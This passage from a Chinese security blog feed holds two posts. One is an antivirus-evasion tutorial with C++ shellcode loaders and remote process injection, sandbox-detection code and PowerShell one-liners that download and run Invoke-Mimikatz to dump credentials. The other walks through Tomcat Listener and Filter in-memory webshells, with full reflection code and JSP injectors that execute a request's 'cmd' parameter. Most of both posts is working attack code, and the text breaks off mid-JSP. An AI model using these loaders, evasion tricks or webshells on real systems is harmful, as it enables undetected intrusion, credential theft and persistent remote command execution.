EXE加壳没什么好说的。可以自写加壳器等等 添加数字签名不同的杀软对数字签名的敏感性不同，有些杀软可能只检查一下有没有数字签名就过了，有些杀软可能要去验证一下数字签名的正确性，有些可能管都不管数字签名。只能说添加数字签名能稍微提升一下exe的免杀几率。 间接运行exe平时我们运行一个exe： cmd /c c:\\a.exe 但这样容易被杀或者命令被ban。所有就有一些间接运行exe的方法 forfilesforfiles是一个用于批处理的一个工具，它在找到文件后会执行指定的命令. forfiles &#x2F;p 指定搜索文件的目录 &#x2F;m 指定搜索关键词 &#x2F;c 指定要执行的命令forfiles &#x2F;p c:\\windows\\system32 &#x2F;m calc.exe &#x2F;c c:\\tmp\\evil.exe &#x2F;&#x2F;evil.exe会成为forfiles.exe的子进程 pcaluapcalua -a c:\\tmp\\evil.exe &#x2F;&#x2F;evil.exe不会成为子进程 cmd Hijack下面命令将弹计算器 cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;cmd.exe &#x2F;c &quot;ping ;a.exe; 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;ping ;a.exe 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe conhost大于win7可用 conhost c:\\windows\\system32\\calc.execonhost adsadas&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe以下指令win10某些版本无法使用conhost &quot;asddas c:\\windows\\system32\\calc.exe&quot; explorer.exeexplorer.exe c:\\windows\\system32\\calc.exeexplorer asdsadasd,&quot;c:\\windows\\system32\\calc.exe&quot; C++指针执行+申请内存动态加载shellcode首先从cobalt strike上生成拿到shellcode用作本次测试。然后通过下面的代码，直接执行写死在程序里的shellcode。 #include &lt;iostream&gt;#include&lt;Windows.h&gt;int main()&#123; unsigned char buf[] &#x3D; &quot;shellcode&quot;; void* exec &#x3D; VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buf, sizeof buf); ((void(*)())exec)(); return 0;&#125; 可以看见，还是很拉跨的。 内联汇编加载shellcodec++有强大的内联汇编功能，上次写壳的时候就感受了一番。我们可以通过内联汇编代码加载shellcode.顺便加花什么的，都可以弄。 #include &lt;iostream&gt;#include&lt;Windows.h&gt;#include&lt;winhttp.h&gt;#pragma comment(lib, &quot;winhttp.lib&quot;)#pragma comment(lib,&quot;user32.lib&quot;)int main()&#123; unsigned char buf[] &#x3D; &quot;shellcode&quot;; _asm &#123; lea eax, buf; jmp eax; &#125;&#125; 还是蛮拉跨的，虽然我没有加花。 HTTP协议远程读取shellcode这次我们不把shellcode写死在程序之中，而是通过程序发起http请求向外界获得shellcode并执行。这里涉及到winhttp.h的一些函数的使用。 源码借用一下 卿 的代码。它的代码是直接把shellcode的十六进制以字符串形式直接放到远程服务器上。像这样 #include &lt;string&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winhttp.h&gt;#pragma comment(lib,&quot;winhttp.lib&quot;)#pragma comment(lib,&quot;user32.lib&quot;)using namespace std;void main()&#123; DWORD dwSize &#x3D; 0; DWORD dwDownloaded &#x3D; 0; LPSTR pszOutBuffer &#x3D; NULL; HINTERNET hSession &#x3D; NULL, hConnect &#x3D; NULL, hRequest &#x3D; NULL; BOOL bResults &#x3D; FALSE; hSession &#x3D; WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); if (hSession) &#123; hConnect &#x3D; WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0); &#125; if (hConnect) &#123; hRequest &#x3D; WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP&#x2F;1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0); &#125; LPCWSTR header &#x3D; L&quot;Content-type: application&#x2F;x-www-form-urlencoded&#x2F;r&#x2F;n&quot;; SIZE_T len &#x3D; lstrlenW(header); WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD); if (hRequest) &#123; std::string data &#x3D; &quot;name&#x3D;host&amp;sign&#x3D;xx11sad&quot;; const void *ss &#x3D; (const char *)data.c_str(); bResults &#x3D; WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0); &#x2F;&#x2F;&#x2F;&#x2F;bResults&#x3D;WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 ); &#125; if (bResults) &#123; bResults &#x3D; WinHttpReceiveResponse(hRequest, NULL); &#125; if (bResults) &#123; do &#123; &#x2F;&#x2F; Check for available data. dwSize &#x3D; 0; if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize)) &#123; printf(&quot;Error %u in WinHttpQueryDataAvailable.\\n&quot;, GetLastError()); break; &#125; if (!dwSize) break; pszOutBuffer &#x3D; new char[dwSize + 1]; if (!pszOutBuffer) &#123; printf(&quot;Out of memory\\n&quot;); break; &#125; ZeroMemory(pszOutBuffer, dwSize + 1); if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123; printf(&quot;Error %u in WinHttpReadData.\\n&quot;, GetLastError()); &#125; else &#123; printf(&quot;ok&quot;); &#125; &#x2F;&#x2F;char ShellCode[1024]; int code_length &#x3D; strlen(pszOutBuffer); char* ShellCode &#x3D; (char*)calloc(code_length &#x2F;2 , sizeof(unsigned char)); for (size_t count &#x3D; 0; count &lt; code_length &#x2F; 2; count++)&#123; sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]); pszOutBuffer +&#x3D; 2; &#125; printf(&quot;%s&quot;, ShellCode); &#x2F;&#x2F;strcpy(ShellCode,pszOutBuffer); void *exec &#x3D; VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, ShellCode, sizeof ShellCode); ((void(*)())exec)(); delete[] pszOutBuffer; if (!dwDownloaded) break; &#125; while (dwSize &gt; 0); &#125; if (hRequest) WinHttpCloseHandle(hRequest); if (hConnect) WinHttpCloseHandle(hConnect); if (hSession) WinHttpCloseHandle(hSession); system(&quot;pause&quot;);&#125; 大致流程便是: 1.通过winhttp中的函数，以HTTP的方法获取远程服务器上的shellcode（此时shellcode在内存中是按照编码结果存储的，如下图，左边是内存原文，右边是内存解码（shellcode）） 2.开辟一段内存，然后通过sscanf等方法读取存储shellcode变量的内容，将内存解码信息录入新的内存空间,使shellcode存在于内存中3.执行shellcode，可以用指针执行等方法执行。 使用加载器加载shellcodeshellcode_ launcher 加载器https://github.com/clinicallyinane/shellcode_launcher/ 用msf或者cs生成raw形式shellcode，然后使用这个加载器加载一下就行了.像这样 shellcode_launcher.exe -i C:\\payload32.binshellcode_ launcher 在virustotal上报毒率也是很高很高了… SSI 加载器https://github.com/DimopoulosElias/SimpleShellcodeInjector cs生成c形式shellcode，然后去除\\x，再拿给ssi加载器加载,像这样 ssi.exe shellcode 即可完成加载 ssi在virustotal上报毒率也是非常高.. 自写加载器ssi源码很简单大家可以参考写一下 shellcode变形大思路就是把shellcode混淆后，放入加载器加载运行。其细分思路就包括怎么把shellcode进行混淆了，简单的有XOR,BASE64，复杂一点的有AES等。这里就只说说xor。首先我们得准备一个程序将shellcode进行混淆。图方便就拿python写也是蛮不错的。随便写了一个。效果真不戳（虽然上传了vt过两天就肯定不能用了) github:https://github.com/ConsT27/SimpleXORshellcode shellcode注入进程内存注入已有进程大致逻辑:OpenProcess获得进程句柄-&gt;VirtualAllocEx在进程中开辟一段内存空间-&gt;WriteProcessMemory向刚刚开辟的内存空间中写入shellcode-&gt;CreateRemoteThread为刚刚写入的shellcode创建一个线程执行 #include &lt;iostream&gt;#include&lt;Windows.h&gt;int main()&#123; unsigned char buf[] &#x3D; &quot;shellcode&quot;; DWORD pid &#x3D; 25388; HANDLE Proc &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!Proc) &#123; std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; LPVOID buffer &#x3D; VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); if (buffer) &#123; std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) )&#123; std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; HANDLE remotethread &#x3D; CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);&#125; 效果:虽然也很拉，但是静态过了趋势是我没想到的。 沙箱绕过（Sandbox Evasion）System Checks检测当前环境是否是沙箱环境，如果是沙箱则不表现出恶意行为。 GetTickCountGetTickCount 是win32 API之一，用来记录电脑开机后的运行时间（以毫秒为单位）我们可以通过这个函数检测当前环境的运行时间，如果时间很短那么就有可能是沙箱。 为什么时间很短就可能是沙箱环境呢？沙箱对恶意程序的检测流程大致如下 1.启动虚拟环境2.将恶意程序复制进虚拟环境3.运行恶意程序一段时间（一般为5分钟）4.获取虚拟环境返回的报告5.关机 全程不过6.7分钟，而正常的机器运行时间肯定是大于这个值的。那么我们就可以定一个标准：如果GetTickCount返回的值小于10min，那么就被判为沙箱环境。 CPU,RAM等信息沙箱的CPUI多为1核，ram多小于2g，硬盘大小多小于100g。我们可以以此为一个基准进行沙箱检测。 &#x2F;&#x2F;cpu processorsSYSTEM_INFO systeminfo; GetSystemInfo(&amp;systeminfo); DWORD numberOfProcessors &#x3D; systeminfo.dwNumberOfProcessors; &#x2F;&#x2F;ram MEMORYSTATUSEX memoryStatus; memoryStatus.dwLength &#x3D; sizeof(memoryStatus); GlobalMemoryStatusEx(&amp;memoryStatus); DWORD RAMMB &#x3D; memoryStatus.ullTotalPhys &#x2F; 1024 &#x2F; 1024;&#x2F;&#x2F;hdd(硬盘大小) HANDLE hDevice &#x3D; CreateFileW(L&quot;\\\\\\\\.\\\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); DISK_GEOMETRY pDiskGeometry; DWORD bytesReturned; DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL); DWORD diskSizeGB; diskSizeGB &#x3D; pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector &#x2F; 1024 &#x2F; 1024 &#x2F; 1024; printf(&quot;cpu:%d,ram:%d,size(gb):%d&quot;, numberOfProcessors, RAMMB, diskSizeGB); mac常见虚拟机如vmware，viturl box等都有特殊的mac地址，可以以此为依据判断是否在虚拟机中（随着虚拟化主机越来越普遍，许多公司将业务系统也搬进了虚拟机，这个方法已不太能作为检测沙箱的指标） “通常，MAC地址的前三个字节标识一个提供商。以00:05:69、00:0c:29和00:50:56开始的MAC地址与VMware相对应；以00:03:ff开始的MAC地址与virtualpc对应；以08:00:27开始的MAC地址与virtualbox对应。” string mac; get_3part_mac(mac); if (mac &#x3D;&#x3D; &quot;00-05-69&quot; || mac &#x3D;&#x3D; &quot;00-0c-29&quot; || mac &#x3D;&#x3D; &quot;00-50-56&quot; || mac &#x3D;&#x3D; &quot;00-03-ff&quot; || mac &#x3D;&#x3D; &quot;08-00-27&quot;) &#123; &#125; else &#123; &#125; void get_3part_mac(string &amp;mac) &#123; NCB Ncb; ASTAT Adapter; UCHAR uRetCode; LANA_ENUM lenum; memset(&amp;Ncb, 0, sizeof(Ncb)); Ncb.ncb_command &#x3D; NCBENUM; Ncb.ncb_buffer &#x3D; (UCHAR *)&amp;lenum; Ncb.ncb_length &#x3D; sizeof(lenum); uRetCode &#x3D; Netbios(&amp;Ncb); for (int i &#x3D; 0; i &lt; lenum.length; i++) &#123; memset(&amp;Ncb, 0, sizeof(Ncb)); Ncb.ncb_command &#x3D; NCBRESET; Ncb.ncb_lana_num &#x3D; lenum.lana[i]; uRetCode &#x3D; Netbios(&amp;Ncb); memset(&amp;Ncb, 0, sizeof(Ncb)); Ncb.ncb_command &#x3D; NCBASTAT; Ncb.ncb_lana_num &#x3D; lenum.lana[i]; strcpy((char *)Ncb.ncb_callname, &quot;*&quot;); Ncb.ncb_buffer &#x3D; (unsigned char *)&amp;Adapter; Ncb.ncb_length &#x3D; sizeof(Adapter); uRetCode &#x3D; Netbios(&amp;Ncb); if (uRetCode &#x3D;&#x3D; 0) &#123; char tmp[128]; sprintf(tmp, &quot;%02x-%02x-%02x&quot;, Adapter.adapt.adapter_address[0], Adapter.adapt.adapter_address[1], Adapter.adapt.adapter_address[2] ); mac &#x3D; tmp; &#125; &#125; &#125; 分辨率沙箱的分辨率都不太正常 鼠标移动轨迹可以设置鼠标移动多少距离才执行shellcode，沙箱有些是没有鼠标的。 POINT CurrentMousePos; POINT PreviousMousePos; GetCursorPos(&amp;PreviousMousePos); double Dis &#x3D; 0; while (true) &#123; GetCursorPos(&amp;CurrentMousePos); Dis+&#x3D; sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2)); Sleep(100); if (Dis &gt; 20000) &#123;&#x2F;&#x2F;*code &#125; &#125; 检查时区与时间流动性沙箱往往会加速运行文件，故可以检查时间流动性是否正常从而检测沙箱 &#x2F;&#x2F;时区 DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo; GetDynamicTimeZoneInformation(&amp;DynamicTimeZoneInfo); wchar_t wcTimeZoneName[128 + 1]; StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName); CharUpperW(wcTimeZoneName); if (!wcsstr(wcTimeZoneName, L&quot;CHINA STANDARD TIME&quot;)) &#123; &#125; &#x2F;&#x2F;流动性 clock_t ClockStartTime, ClockEndTime; time_t UnixStartTime &#x3D; time(0); ClockStartTime &#x3D; clock(); Sleep(10000); ClockEndTime &#x3D; clock(); time_t UnixEndTime &#x3D; time(0); int iTimeDifference &#x3D; ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime); if (iTimeDifference&gt;150)&#123;&#x2F;&#x2F;*code &#125; 检测文件名是否被沙箱更改wchar_t currentProcessPath[MAX_PATH + 1];GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);CharUpperW(currentProcessPath);if (!wcsstr(currentProcessPath, L&quot;evil.EXE&quot;)) return false; Time-Based Evasion基于时间的规避。即恶意软件在目标系统上运行后并不会立刻进行恶意行动，而是会伪装、休眠一段时间，等到一定时间后再开始恶意行动 API泛洪内联代码User Activity Based Checks通过检测一些行为，来识别当前实施者是否为人类。（比如动鼠标，敲键盘等，或者查询电脑上word文档打开历史数，chrome历史记录等信息来判断） Powershell远程执行与本地执行远程执行powershell可以加载远程的ps1文件。这样做的好处是实现了无文件落地。 powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot; 不过市面上很多杀软对downloadstring检测十分十分严格(许多会检测远程文件安全性） powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb) 本地执行powershell Import-Module .\\xx.ps1 命令拆分就像刚刚远程加载的downloadstring法，它很容易被杀软拦截。但是我们可以通过拆分重组绕过一些杀软检测。 powershell -c &quot;$c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;webserver&#x2F;xxx.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot; GO申请内存加载shellcode","categories":[],"tags":[{"name":"免杀","slug":"免杀","permalink":"http://const27.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"tomcat Listener，Filter内存马简要分析","slug":"tomcat Listener，Filter内存马简要分析","date":"2021-06-28T13:51:11.051Z","updated":"2021-06-27T04:44:52.997Z","comments":true,"path":"2021/06/28/tomcat Listener，Filter内存马简要分析/","link":"","permalink":"http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/","excerpt":"","text":"tomcat内存马tomcat 容器tomcat 主要包含四种容器：Engine，Host，Context，Wrapper。其对应关系如下图 详细解读一下这个图。 一台服务器上是可以配置多个站点的，对于tomcat来说，每一个站点就对应一个HOST。 一个站点上是可以配置多个WEB应用的，比如说一个站点可能会有OA，SSO，邮件应用等等WEB应用，对于tomcat来说每一个WEB应用便对应着一个Context。 一个WEB应用中肯定也有多个访问路径，比如说OA可能就有登录，前端展示，搜索等。所以对于每一个访问路径tomcat都会分配一个Wrapper，每一个Wrapper对应一个Servlet，用于处理特定请求。 Listener 内存马tomcat收到请求时，处理顺序是 Listener-&gt;Filter-&gt;Servlet。也就是说Listener是最先接触到数据请求的，我们可以在Listener上做手脚从而达到内存马的目的。 实际上，我们想实现一个内存马，思路便是想让tomcat执行一段恶意程序，把恶意的listener或者filter类写入tomcat内存中，由于tomcat处理请求时，请求会被listener和filter处理（也就是说会被我们的恶意类处理），因此达到隐蔽的木马功能。 具体怎么个实现呢？我们可以大致想象一个思路：获取服务器初步权限后，创建一个JSP并向内写入向内存注入恶意Listener或filter的代码，随后访问JSP触发JSP代码，恶意Listener或filter被注入内存，随后删除JSP，通过恶意Listener或filter实现无文件webshell。但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错，具体解决方法就是下文的内容了： ServletContext如果我们想添加一个Listener，那么势必会用到一个方法：addListener。 我们来分析以下这个方法，想办法通过addListener方法把恶意Listener注入内存。首先addListener方法是这么用的。 ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();servletContext.addListener(&quot;&quot;); 我们直接跟进addListener，会发现跟进到了ServletContext这个接口类。 那么实现addListener的类是什么呢？换句话说，servletContext这个实例化对象是如何被实例化的呢？ ApplicationContext 通过调试，我们发现servletContext这个对象实际上是一个ApplicationContextFacade对象。我们跟进到ApplicationContextFacade.class中，查看addListener方法的实现。 发现实际上是调用了ApplicationContext类的addListener方法。再次跟进。 这里还调用了一个addListener，再次跟进。 这里借用的别人的图，可以发现如果服务器已启动，那么通过直接调用addListener是无法添加监听器的。 究其原因，便是此处的context是StandardContext，它的状态是开始状态，无法在if判断中返回true。这也就是上文提到的 “但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错” 如果能够突破if判断，来到此处，那么监听器就会被顺利的添加上 编写Listener内存马既然阻碍我们添加Listener的原因已经找到了，那么就应该考虑如何绕过这个限制了。很简单，通过反射即可绕过这个限制。 在编写反射代码之前，我们有必要去看一下，我们怎样才能通过反射”够到”StandardContext的addApplicationEventListener方法。 可以直观的看到，我们可以通过servletContext获得它的context属性（ApplicationContext对象），然后通过ApplicationContext对象的context获得StandardContext对象，然后调用addApplicationEventListener方法。很好。 反射代码 ServletContext servletContext &#x3D; this.getServletConfig().getServletContext(); Field field &#x3D; servletContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(servletContext); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); standardContext.addApplicationEventListener(new MyListener(request,response)); &#x2F;&#x2F;这一行是将某个Listener类添加到监听器 恶意Listenerpublic class MyListenr implements ServletRequestListener &#123; public ServletResponse response; public ServletRequest request; MyListenr(ServletRequest request, ServletResponse response) &#123; this.request &#x3D; request; this.response &#x3D; response; &#125; public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123; &#125; public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123; String cmder &#x3D; request.getParameter(&quot;cmd&quot;); try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmder); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;执行结果加上回车 sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); this.response.getWriter().write(result); &#125; catch (Exception e) &#123; System.out.println(&quot;error &quot;); &#125; &#125;&#125; 实验一下 我们先访问/a路由，让代码被执行。然后到任意页面传入恶意参数 SUCCESS。 为了更方便的注入内存马，我从网上嫖了一个JSP（Linux版）。只要我们上传该JSP然后访问它一下，内存马就被注入了，十分的方便。 &lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%@ page import&#x3D;&quot;org.apache.jasper.tagplugins.jstl.core.Out&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;&lt;%@ page import&#x3D;&quot;javax.servlet.annotation.WebServlet&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;&lt;% Object obj &#x3D; request.getServletContext(); Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); ListenH listenH &#x3D; new ListenH(request, response); standardContext.addApplicationEventListener(listenH); out.print(&quot;test&quot;);%&gt;&lt;%! public class ListenH implements ServletRequestListener &#123; public ServletResponse response; public ServletRequest request; ListenH(ServletRequest request, ServletResponse response) &#123; this.request &#x3D; request; this.response &#x3D; response; &#125; public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123; &#125; public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123; String cmder &#x3D; request.getParameter(&quot;cmd&quot;); String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;; try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmd); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;执行结果加上回车 sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); this.response.getWriter().write(result); &#125;catch (Exception e)&#123; System.out.println(&quot;error &quot;); &#125; &#125; &#125;%&gt; Filter 内存马Filter内存马与Listener内存马还是有点区别的，要复杂一点点 doFilter方法如何被执行？配置filter再开始分析Filter内存马时，我们需要先知道，Filter类中的doFilter方法是如何被执行的。 OK我们先创建好一个Filter。 Filter类代码public class MyFilter implements ServletRequestListener &#123; public void destroy() &#123; &#125; public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123; System.out.println(&quot;Filter!&quot;); chain.doFilter(req,resp); &#125; public void init(FilterConfig config) throws ServletException &#123; &#125;&#125; 接下来在web.xml中添加Filter。 我们在doFilter方法处下断点，运行，得到调用帧如下 filterchain我们从StandardWrapperValue#invoke 处开始分析. filterChain.doFilter(request.getRequest(), response.getResponse()); 那么这个filterChain是什么？我们跟进一下 再度跟进到createFilterChain方法，来到了ApplicationFilterFactory.java里。 比较关键的代码是这里。这个方法会遍历FilterMaps，检测每个FilterMap项对应的那个Filter与请求的路由等是否一致。若一致则将以该filter的name为参数去FilterConfigs里去寻找对应的FilterConfig,然后将该filterconfig放入filterchain中。不一致的则抛弃。 filterconfig与filterdef那么filterconfig又是个什么样的东西呢？ 我们跟进context.findFilterConfig,这里的context是StandardContext。 再度跟进filterconfigs，就可以很明显的发现filterconfigs是一个hashmap结构 键为filter名，值为filterconfig 那么filterconfig的结构又是如何。我们跟进ApplicationFilterConfig类。下图是此类的构造函数 关键地方圈出来了是与filterdef有关的代码。在构造函数的时候将传入context和filterdef，然后再通过对filterdef调用getfilter获得filter类（即我们自己定义的filter类）。 我们再看看filterDef的关键代码 OKOK，上面就是FilterConfig，FilterChain和FilterDef的一些零碎的介绍。我们大致可以得到下列关键信息 FilterConfigs 是一个HashMap结构，键为filter名，值为filterconfigfilterconfig包含了filterdeffilterdef直接与filter类相关联 StandardWrapperValue#invoke 这一层分析完了，这一层是最麻烦的，向下两层将会亲切很多。 下面的两层向下分析来到ApplicationFilterChain#doFilter.这一层很简单，调了个internalDofilter就没了 再向下分析来到ApplicationFilterChain#internalDoFilter。 关键的地方圈出来了，大致就是通过filterchain里的filterconfig的getFilter方法（下图为getFilter方法，可以明显看到是返回了filter）从而获得filterdef里的filter，从而调用filter的dofilter，这就是大概的流程。 加载过程流程图文字总是有些贫瘠的，用图来说话就会明了许多。 FilterDef添加我们如何把FilterDef与我们的Filter关联起来并添加到standardContext中呢？这个问题比较关键，因为我们必须将我们的FilterDef注入到内存才能让我们的Filter有被调用的可能性。 实际上呢，也很简单。流程上来说与Listener内存马差不多 打断点 跟进 再跟 继续跟 来到此处，与Listener内存马神似。if判断里判断了程序是否在运行context是standardContext，这里调用了它的addFilterDef来添加FilterDef。 编写Filter内存马既然流程已经明白了，那写起来就不难了.至于为什么要用反射，原因和Listener是一样的。 反射代码try &#123; response.getWriter().write(&quot;a&quot;); System.out.println(&quot;Servlet Get Message\\n&quot;); Object obj &#x3D; request.getServletContext(); Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); &#x2F;&#x2F;获取standardContext FilterDef filterDef &#x3D; new FilterDef(); filterDef.setFilter(new MyFilter()); filterDef.setFilterName(&quot;MyFilter&quot;); standardContext.addFilterDef(filterDef); &#x2F;&#x2F;将FilterDef与filter关联，注入到内存 field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); field.setAccessible(true); HashMap filterConfigs &#x3D; (HashMap) field.get(standardContext);&#x2F;&#x2F;获取filterConfigs Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;). getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); filterConfigs.put(&quot;MyFilter&quot;,constructor.newInstance(standardContext,filterDef)); &#x2F;&#x2F;将包含filterDef的filterConfig添加到filterConfigs FilterMap filterMap &#x3D; new FilterMap(); filterMap.addURLPattern(&quot;&#x2F;*&quot;); filterMap.setFilterName(&quot;MyFilter&quot;); standardContext.addFilterMapBefore(filterMap); &#x2F;&#x2F;将该filterMap与filterConfig进行NAME绑定并放到filterMaps的首位 &#125; catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) &#123; e.printStackTrace(); &#125; 木马本体public class MyFilter implements Filter &#123; public void destroy() &#123; &#125; public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123; String cmder &#x3D; req.getParameter(&quot;cmd&quot;); try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmder); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;执行结果加上回车 sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); resp.getWriter().write(result); &#125;catch (Exception e)&#123; System.out.println(&quot;error &quot;); &#125; chain.doFilter(req,resp); &#125; public void init(FilterConfig config) throws ServletException &#123; &#125;&#125; 网上嫖的JSP &lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page 